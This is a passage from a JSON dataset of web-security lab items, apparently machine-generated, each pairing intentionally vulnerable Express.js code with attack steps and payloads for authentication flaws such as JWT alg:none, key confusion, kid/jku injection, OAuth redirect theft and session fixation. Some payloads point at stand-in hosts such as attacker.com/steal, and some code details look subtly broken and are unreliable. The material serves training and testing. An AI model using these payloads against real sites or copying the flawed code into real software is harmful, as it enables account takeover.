    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst RSA_PUBLIC_KEY = fs.readFileSync('./public.key');\nconst HMAC_SECRET = 'weak-secret-key';\n\napp.get('/admin', (req, res) => {\n    const token = req.headers.authorization?.split(' ')[1];\n    try {\n        const decoded = jwt.verify(token, RSA_PUBLIC_KEY, { algorithms: ['HS256', 'RS256'] });\n        if (decoded.role === 'admin') {\n            res.send('Admin access granted');\n        } else {\n            res.status(403).send('Forbidden');\n        }\n    } catch (e) {\n        res.status(401).send('Invalid token');\n    }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0.fake-signature"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL mutation race condition",
    "Lab Description": "The application's GraphQL mutation for session generation contains a race condition when multiple requests are sent simultaneously. The vulnerable implementation allows session tokens to remain valid after password changes. To solve: fixate session token during password reset and maintain access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify session mutation in GraphQL introspection using Postman",
      "Send parallel requests for password change and session refresh",
      "Capture valid session token before invalidation occurs",
      "Maintain authenticated state with captured token post-reset",
      "Execute privileged GraphQL queries with fixated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst app = express();\n\nconst schema = buildSchema(`\n  type Mutation {\n    changePassword(old: String!, new: String!): Boolean\n    refreshSession: String\n  }\n`);\n\nlet currentSession = null;\n\nconst root = {\n  changePassword: ({old, new: newPass}) => {\n    currentSession = null;\n    return true;\n  },\n  refreshSession: () => {\n    currentSession = `session_${Math.random().toString(36).substr(2)}`;\n    return currentSession;\n  }\n};\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(4000);",
    "payloads": [
      "mutation { refreshSession }",
      "mutation { changePassword(old: \"oldPass\", new: \"newPass\") }",
      "{\"query\":\"mutation { refreshSession changePassword(old: \\\"victim\\\", new: \\\"hacked\\\") }\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via verbose error messages",
    "Lab Description": "The application's OAuth token endpoint leaks sensitive information through detailed error responses. The vulnerable implementation reveals valid tokens in error messages during race conditions. To solve: trigger token leakage through concurrent requests and harvest valid tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept OAuth token request in Burp Suite",
      "Send duplicate token requests simultaneously using Turbo Intruder",
      "Analyze error responses for leaked token information",
      "Extract valid tokens from verbose error messages",
      "Use stolen tokens to authenticate as victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst tokens = {};\n\napp.post('/oauth/token', (req, res) => {\n    const { code } = req.body;\n    if (tokens[code]) {\n        res.status(400).json({ \n            error: `Token ${tokens[code]} already issued for code ${code}` \n        });\n    } else {\n        const token = `token_${Math.random().toString(36).substr(2)}`;\n        tokens[code] = token;\n        res.json({ access_token: token });\n    }\n});\n\napp.listen(3001);",
    "payloads": [
      "code=legit_code&client_id=attacker",
      "code=victim_code&client_id=attacker",
      "{\"code\":\"victim_code\",\"client_id\":\"attacker\"}"
    ]
  },
  {
    "Lab scenario": "JWT claim injection via unverified header parameters in REST API",
    "Lab Description": "The application's JWT validation fails to verify all header parameters while processing tokens. The vulnerable implementation allows injecting custom claims through unverified header parameters. To solve: escalate privileges by injecting admin claims through custom headers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT in Burp Suite and decode to analyze structure",
      "Add custom header parameter 'x5c' with forged claims",
      "Modify payload to include 'role':'admin' in custom header",
      "Verify server processes injected claims by checking response",
      "Access admin functionality with elevated privileges"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst SECRET = 'weak-secret-123';\n\napp.get('/admin', (req, res) => {\n    const token = req.headers.authorization?.split(' ')[1];\n    try {\n        const decoded = jwt.verify(token, SECRET, { ignoreHeaders: false });\n        if (decoded.header?.x5c?.role === 'admin') {\n            res.send('Admin access granted');\n        } else {\n            res.status(403).send('Forbidden');\n        }\n    } catch (e) {\n        res.status(401).send('Invalid token');\n    }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6eyJyb2xlIjoiYWRtaW4ifX0.eyJzdWIiOiIxMjM0In0.fake-signature",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImN1c3RvbSI6eyJyb2xlIjoiYWRtaW4ifX0.eyJ1c2VyIjoiam9obiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket subprotocol negotiation",
    "Lab Description": "The application's WebSocket implementation assigns sessions during subprotocol negotiation without proper validation. The vulnerable handshake process allows session fixation through crafted subprotocol headers. To solve: fixate session ID during WS connection and hijack authenticated session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture WebSocket handshake in OWASP ZAP",
      "Modify Sec-WebSocket-Protocol header to include session token",
      "Force server to accept custom session ID during negotiation",
      "Trick victim into authenticating with fixated session",
      "Reuse WebSocket connection with victim's privileges"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ \n    server,\n    handleProtocols: (protocols) => {\n        return protocols.includes('session-fixation') ? 'session-fixation' : false;\n    }\n});\n\nwss.on('connection', (ws, req) => {\n    const protocol = req.headers['sec-websocket-protocol'];\n    if (protocol.includes('session=')) {\n        ws.sessionId = protocol.split('session=')[1];\n    }\n    ws.send(`Connected with session: ${ws.sessionId}`);\n});",
    "payloads": [
      "GET /chat HTTP/1.1\r\nHost: vulnerable.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Protocol: session=fixed-session-id\r\n\r\n",
      "Sec-WebSocket-Protocol: session=attacker-controlled-id"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via insecure PKCE implementation",
    "Lab Description": "The application's OAuth PKCE flow fails to properly validate code verifier against code challenge. The vulnerable implementation allows bypassing PKCE protection through parameter manipulation. To solve: steal authorization code by intercepting and replaying requests with modified parameters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow and capture PKCE parameters in Burp Suite",
      "Intercept authorization code before redirection",
      "Remove code_verifier parameter from token request",
      "Modify code_challenge_method to 'plain'",
      "Exchange stolen code for access token without valid verifier"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst codes = {};\n\napp.get('/oauth/authorize', (req, res) => {\n    const { code_challenge, code_challenge_method } = req.query;\n    const code = `authcode_${Math.random().toString(36).substr(2)}`;\n    codes[code] = { challenge: code_challenge, method: code_challenge_method };\n    res.redirect(`/callback?code=${code}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n    const { code, code_verifier } = req.body;\n    if (!codes[code]) return res.status(400).send('Invalid code');\n    \n    const { method } = codes[code];\n    if (method === 'plain') {\n        res.json({ access_token: 'token_123' });\n    } else {\n        res.status(400).send('PKCE validation failed');\n    }\n});\n\napp.listen(3001);",
    "payloads": [
      "/oauth/authorize?code_challenge=plain&code_challenge_method=plain",
      "code=stolen_code&code_verifier=&code_challenge_method=plain",
      "{\"code\":\"stolen_code\",\"code_verifier\":null}"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "This lab's JWT implementation fails to validate the algorithm properly. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: forge an admin token by modifying your JWT without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in as a regular user and capture the JWT in Burp Suite",
      "2. Decode the JWT using jwt.io or Burp Decoder to analyze its structure",
      "3. Change the 'alg' header to 'none' and modify the 'role' claim to 'admin'",
      "4. Remove the signature portion (set to empty string after the last dot)",
      "5. Submit the modified token in the Authorization header to access admin endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    if (decoded.header.alg === 'none') {\n      const payload = decoded.payload;\n      if (payload.role === 'admin') {\n        return res.send('Admin access granted');\n      }\n    }\n    res.status(403).send('Access denied');\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured redirect_uri",
    "Lab Description": "This lab's OAuth implementation fails to validate redirect URIs properly. The application leaks authorization codes to arbitrary domains. To solve: steal an OAuth code from the victim user and exchange it for an access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the OAuth flow in Burp Suite and note the redirect_uri parameter",
      "2. Craft a malicious link with your attacker server as redirect_uri",
      "3. Use Postman to simulate the victim clicking the link",
      "4. Capture the authorization code sent to your server",
      "5. Exchange the code for an access token using the OAuth token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst clients = {'legit-client': {secret: 'abc123', redirect_uris: ['https://client.com/callback']}};\napp.get('/auth', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  const code = 'RANDOM_CODE_' + Math.random().toString(36).substring(2);\n  res.redirect(`${redirect_uri}?code=${code}`);\n});\napp.post('/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    res.json({ access_token: 'FAKE_ACCESS_TOKEN', token_type: 'bearer' });\n  } else {\n    res.status(401).send('Invalid client credentials');\n  }\n});\napp.listen(3001);",
    "payloads": [
      "https://oauth-lab.com/auth?client_id=legit-client&redirect_uri=https://attacker.com/callback",
      "https://oauth-lab.com/auth?client_id=legit-client&redirect_uri=http://localhost:9999/steal"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL mutation",
    "Lab Description": "This lab's GraphQL endpoint allows setting arbitrary session IDs through a mutation. The application doesn't regenerate session IDs after authentication. To solve: fixate a session ID and trick an admin into authenticating with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to send a SetSession mutation with a predictable session ID",
      "2. Craft a CSRF payload containing the fixed session ID",
      "3. Induce the admin to visit your malicious page while monitoring traffic in OWASP ZAP",
      "4. When the admin authenticates, reuse the session ID to gain access",
      "5. Perform privileged actions through the GraphQL API"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst schema = buildSchema(`\n  type Mutation {\n    setSession(id: String!): String\n  }\n  type Query {\n    getSecretData: String\n  }\n`);\nconst root = {\n  setSession: ({id}) => {\n    return `Session set to ${id}`;\n  },\n  getSecretData: () => {\n    return 'Sensitive data';\n  }\n};\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\napp.listen(4000);",
    "payloads": [
      "mutation { setSession(id: \"FIXATED_SESSION\") }",
      "{\"query\":\"mutation { setSession(id: \\\"ADMIN_SESSION\\\") }\"}"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice authentication",
    "Lab Description": "This lab's JWT validation improperly processes the kid header, allowing path traversal to arbitrary verification keys. The application blindly trusts the kid parameter when loading verification keys. To solve: forge a valid admin token by forcing the system to use a predictable public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture a valid JWT using Burp Suite and decode its headers",
      "2. Identify the kid parameter pointing to key storage location",
      "3. Modify the kid header to traverse to /dev/null or /proc/self/fd/0",
      "4. Set alg to HS256 and sign with an empty key",
      "5. Replace the original token with your forged version to gain admin access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst loadKey = (kid) => {\n    return fs.readFileSync(kid);\n};\n\napp.post('/verify', (req, res) => {\n    const token = req.body.token;\n    try {\n        const header = jwt.decode(token, {complete: true}).header;\n        const key = loadKey(header.kid);\n        const decoded = jwt.verify(token, key);\n        if(decoded.admin) {\n            res.send('Admin access granted');\n        } else {\n            res.status(403).send('Access denied');\n        }\n    } catch(e) {\n        res.status(401).send('Invalid token');\n    }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJhZG1pbiI6dHJ1ZX0.7Z6nQkzX0zH6XQ9XJ6Z9XQ9XJ6Z9XQ9XJ6Z9XQ9XJ6Z9XQ",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9wcm9jL3NlbGYvZmQvMCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.1Q9XJ6Z9XQ9XJ6Z9XQ9XJ6Z9XQ9XJ6Z9XQ9XJ6Z9XQ"
    ]
  },
  {
    "Lab scenario": "Session swapping via concurrent SOAP requests",
    "Lab Description": "This lab's SOAP API maintains session state improperly during concurrent requests. The application processes authentication and session updates asynchronously. To solve: perform a race condition attack to swap a low-privilege session with an admin session before authorization checks complete.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture valid login and session update requests in OWASP ZAP",
      "2. Identify the session ID parameter vulnerable to race conditions",
      "3. Craft 20 parallel requests mixing authentication and privilege escalation",
      "4. Use Postman's runner feature to send concurrent requests",
      "5. Verify session elevation by accessing admin-only endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst soap = require('express-soap');\nconst app = express();\n\nlet sessions = {};\n\napp.use('/soap', soap({\n    login: (args) => {\n        const user = authenticateUser(args);\n        sessions[args.sessionId] = {user: user, isAdmin: false};\n        return {success: true};\n    },\n    elevate: (args) => {\n        if(sessions[args.sessionId]) {\n            sessions[args.sessionId].isAdmin = true;\n        }\n        return {success: true};\n    }\n}));\n\napp.listen(3000);",
    "payloads": [
      "<soap:Envelope><soap:Body><login><sessionId>RACE_CONDITION</sessionId></login></soap:Body></soap:Envelope>",
      "<soap:Envelope><soap:Body><elevate><sessionId>RACE_CONDITION</sessionId></elevate></soap:Body></soap:Envelope>"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via insecure PKCE implementation",
    "Lab Description": "This lab's OAuth flow implements PKCE security incorrectly by not verifying the code_challenge method. The application accepts arbitrary code_verifier values after authorization. To solve: intercept the authorization code and redeem it with a brute-forced code_verifier.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Initiate OAuth flow and capture authorization code in Burp",
      "2. Observe missing code_challenge_method validation",
      "3. Use sqlmap to brute-force the code_verifier parameter",
      "4. Intercept the token exchange request and insert valid verifier",
      "5. Capture the access token and access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nlet authCodes = {};\n\napp.get('/authorize', (req, res) => {\n    const code = generateRandomCode();\n    authCodes[code] = {clientId: req.query.client_id};\n    res.redirect(`${req.query.redirect_uri}?code=${code}`);\n});\n\napp.post('/token', (req, res) => {\n    if(authCodes[req.body.code]) {\n        res.json({\n            access_token: 'FAKE_TOKEN',\n            token_type: 'Bearer'\n        });\n    }\n});\n\napp.listen(3000);",
    "payloads": [
      "code=SOME_CODE&code_verifier=BRUTE_FORCED_VALUE",
      "grant_type=authorization_code&code=STOLEN_CODE&code_verifier=000000"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Description": "This lab's JWT implementation trusts arbitrary jku (JWK Set URL) headers for key verification. The application fails to validate the jku domain against an allowlist. To solve: host a malicious JWK Set and forge an admin token by forcing the server to use your public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture a valid JWT using Burp Suite and decode its headers",
      "2. Identify the vulnerable jku header parameter",
      "3. Generate a RSA key pair using OpenSSL",
      "4. Host a malicious JWK Set JSON file on your attacker server",
      "5. Craft a new token with jku pointing to your server and signed with your private key"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/verify', async (req, res) => {\n    const token = req.body.token;\n    try {\n        const header = jwt.decode(token, {complete: true}).header;\n        const jwks = await axios.get(header.jku);\n        const key = jwks.data.keys[0].x5c[0];\n        const decoded = jwt.verify(token, key);\n        if(decoded.admin) {\n            res.send('Admin access granted');\n        } else {\n            res.status(403).send('Access denied');\n        }\n    } catch(e) {\n        console.error('JWT verification failed:', e);\n        res.status(401).send('Invalid token');\n    }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItc2VydmVyLmNvbS9tYWxpY2lvdXMuanNvbiJ9.eyJhZG1pbiI6dHJ1ZX0.SIGNATURE",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6OTk5OS9rZXlzIn0.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "Session token leakage via GraphQL introspection",
    "Lab Description": "This lab's GraphQL endpoint has introspection enabled and leaks session tokens through error messages. The application improperly handles authentication errors in the GraphQL resolver. To solve: extract valid session tokens from verbose error responses and hijack an admin session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to send malformed GraphQL queries triggering errors",
      "2. Analyze error responses in OWASP ZAP for leaked session tokens",
      "3. Extract valid tokens from error stack traces",
      "4. Identify admin tokens by checking privileges via introspection",
      "5. Reuse stolen tokens to access admin functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type Query {\n    getAdminData(token: String!): String\n  }\n`);\n\nconst root = {\n  getAdminData: ({token}) => {\n    try {\n      if(token === 'ADMIN_SECRET_TOKEN') {\n        return 'Sensitive admin data';\n      }\n      throw new Error(`Invalid token: ${token} provided`);\n    } catch(err) {\n      console.error('Full error:', err.stack);\n      throw err;\n    }\n  }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(4000);",
    "payloads": [
      "{\"query\":\"query { __schema { types { name } } }\"}",
      "{\"query\":\"query { getAdminData(token: \\\"invalid\\\") }\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token theft via open redirect with fragment",
    "Lab Description": "This lab's OAuth implementation is vulnerable to token leakage through an open redirect that preserves URL fragments. The application passes access tokens in the fragment during redirects but doesn't validate the target domain. To solve: craft a malicious redirect URL that captures the token fragment.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Initiate OAuth flow and intercept the redirect in Burp Suite",
      "2. Identify the redirect_uri parameter accepting arbitrary domains",
      "3. Craft a URL with your attacker domain and preserve the # fragment",
      "4. Induce the victim to click the malicious link",
      "5. Capture the token from your server logs and use it to access the API"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n    const token = 'FAKE_TOKEN';\n    res.redirect(`${req.query.redirect_uri}#access_token=${token}`);\n});\n\napp.get('/authorize', (req, res) => {\n    res.redirect(`/oauth/callback?redirect_uri=${req.query.redirect_uri}`);\n});\n\napp.listen(3000);",
    "payloads": [
      "https://oauth-lab.com/authorize?redirect_uri=https://attacker.com/steal",
      "https://oauth-lab.com/authorize?redirect_uri=http://localhost:9999/capture#fragment"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake",
    "Lab Description": "This lab's WebSocket implementation assigns session tokens during the handshake process without proper validation. The application accepts arbitrary session tokens in the WS upgrade request headers. To solve: fixate a session token and trick an admin into authenticating with it via WebSocket communication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to intercept WebSocket connections",
      "2. Identify the Session-Token header in WS upgrade requests",
      "3. Craft a malicious WebSocket client with a fixed session token",
      "4. Induce admin to interact with your WebSocket endpoint",
      "5. Hijack the authenticated session using your pre-set token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst wss = new WebSocket.Server({ noServer: true });\nconst sessions = {};\n\napp.server = app.listen(3000);\napp.server.on('upgrade', (request, socket, head) => {\n    const token = request.headers['session-token'] || 'default';\n    sessions[token] = { authenticated: false };\n    \n    wss.handleUpgrade(request, socket, head, (ws) => {\n        ws.session = sessions[token];\n        wss.emit('connection', ws, request);\n    });\n});\n\nwss.on('connection', (ws) => {\n    ws.on('message', (message) => {\n        if(message === 'AUTH_SECRET') {\n            ws.session.authenticated = true;\n        }\n    });\n});",
    "payloads": [
      "GET / HTTP/1.1\\r\\nHost: localhost\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\nSession-Token: FIXATED_TOKEN\\r\\n\\r\\n",
      "{\"type\":\"auth\",\"token\":\"FIXATED_TOKEN\"}"
    ]
  },
  {
    "Lab scenario": "JWT timestamp manipulation via nbf claim",
    "Lab Description": "This lab's JWT validation improperly handles the 'nbf' (not before) claim when the server clock is skewed. The application fails to verify the timestamp against a trusted time source. To solve: forge a token with a future nbf claim and exploit clock drift to gain premature access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture a valid JWT using Burp Suite and decode it",
      "2. Identify the nbf claim in the payload",
      "3. Craft a new token with nbf set far in the future",
      "4. Use Postman to send requests with the modified token",
      "5. Observe server accepts the token due to clock synchronization issues"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst secret = 'insecure_secret';\nconst futureDate = new Date();\nfutureDate.setFullYear(futureDate.getFullYear() + 1);\n\napp.get('/protected', (req, res) => {\n    const token = req.headers.authorization?.split(' ')[1];\n    try {\n        const decoded = jwt.verify(token, secret, { clockTolerance: 300 });\n        res.send('Access granted');\n    } catch(e) {\n        console.error('JWT error:', e.message);\n        res.status(403).send('Access denied');\n    }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE5MDAwMDAwMDB9.INVALID_SIGNATURE",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYmYiOjQxNDcxOTQ0MDB9.INVALID_SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via mixed content",
    "Lab Description": "This lab's OAuth implementation serves token responses over HTTP when initiated from HTTPS pages. The application fails to enforce strict transport security for token endpoints. To solve: perform a MITM attack to intercept tokens when victims visit mixed-content pages.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Identify OAuth endpoints loading over HTTP using Burp Suite",
      "2. Craft a malicious HTTPS page initiating OAuth flow",
      "3. Use OWASP ZAP to intercept the insecure token response",
      "4. Capture the access token from plaintext transmission",
      "5. Reuse the token to access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/token', (req, res) => {\n    res.json({\n        access_token: 'INSECURE_TOKEN',\n        token_type: 'bearer',\n        expires_in: 3600\n    });\n});\n\napp.get('/authorize', (req, res) => {\n    const protocol = req.headers['x-forwarded-proto'] || req.protocol;\n    res.redirect(`${protocol}://${req.get('host')}/oauth/token`);\n});\n\napp.listen(3000);",
    "payloads": [
      "http://oauth-lab.com/authorize?response_type=token",
      "http://oauth-lab.com/oauth/token?grant_type=implicit"
    ]
  },
  {
    "Lab scenario": "JWT tampering due to lack of signature validation",
    "Lab Description": "This application's authentication mechanism uses JSON Web Tokens (JWTs) to manage user sessions. However, the backend fails to validate the signature of the JWT during decoding. The application trusts the payload content blindly. To solve: craft a tampered JWT to escalate from a regular user to admin and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture the JWT token issued after logging in as a regular user using Burp Suite's Proxy.",
      "Send the token to Burp Decoder and base64-decode its header and payload to observe structure and roles.",
      "Modify the 'alg' to 'none' and change 'role' to 'admin' in the payload.",
      "Re-encode the header and payload using base64 (URL-safe, no padding), concatenate them with a trailing dot.",
      "Replace the original token in the Authorization header with the tampered one and request /admin/dashboard.",
      "Verify admin access by confirming presence of admin-specific controls on the dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'user1', password: 'pass1', role: 'user' }, { username: 'admin', password: 'admin123', role: 'admin' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ username: user.username, role: user.role }, 'notsosecret'); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const decoded = jwt.decode(token); if (decoded && decoded.role === 'admin') { res.send('Welcome to admin dashboard'); } else { res.status(403).send('Forbidden'); } }); app.listen(3000, () => console.log('JWT Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in URL",
    "Lab Description": "This application uses a custom session ID passed via the URL as a GET parameter. The backend sets the session without validating ownership, enabling an attacker to force a session ID on a victim before login. To solve: fix a session for Carlos, trick him into logging in, then reuse the session ID to hijack his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to generate a new session by visiting /login?session_id=attacker123.",
      "Copy the generated login URL and craft a phishing link targeting Carlos with the fixed session_id.",
      "Assume Carlos logs in with the provided session ID, which remains active.",
      "After login, reuse the same session_id=attacker123 from a different browser using Postman to access /my-account.",
      "Confirm session hijack by accessing Carlos\u00e2\u20ac\u2122s account page or seeing personalized information."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { const sid = req.query.session_id; if (!sid) return res.send('No session ID provided'); sessions[sid] = null; res.send('<form action=\"/auth?session_id=' + sid + '\" method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/auth', (req, res) => { const { username, password } = req.body; const sid = req.query.session_id; const user = users.find(u => u.username === username && u.password === password); if (user && sid) { sessions[sid] = user.username; res.redirect('/my-account?session_id=' + sid); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { const sid = req.query.session_id; if (sessions[sid]) { res.send('Welcome back, ' + sessions[sid]); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "http://victim-site.com/login?session_id=attacker123",
      "http://victim-site.com/my-account?session_id=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion leads to authentication bypass",
    "Lab Description": "The application uses JWTs for session management but accepts both RS256 and HS256 algorithms interchangeably. The backend uses RS256 with a public key to validate tokens, but it fails to enforce the algorithm type. The application naively uses the public key as a secret when validating HS256 tokens. To solve: craft a forged JWT to log in as the administrator user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the JWT from a valid session and decode it using jwt.io.",
      "Verify the 'alg' field is set to RS256 and identify that the application uses a public key endpoint for JWT verification.",
      "Craft a malicious JWT with the algorithm set to HS256 and use the public key (downloaded from the /jwks endpoint) as the HMAC secret.",
      "Generate a token with { \"username\": \"admin\" } as the payload and sign it using HS256 with the public key as the secret in jwt.io.",
      "Replace the JWT in your session cookie with the forged token and access /admin to verify success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.use(require('cookie-parser')()); app.get('/profile', (req, res) => { const token = req.cookies.auth; try { const decoded = jwt.verify(token, publicKey); res.send(`Welcome ${decoded.username}`); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
    "payloads": [
      "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"username\": \"admin\" }.[HMAC-SHA256 signature using public key]",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0=[forged signature using public key as secret]"
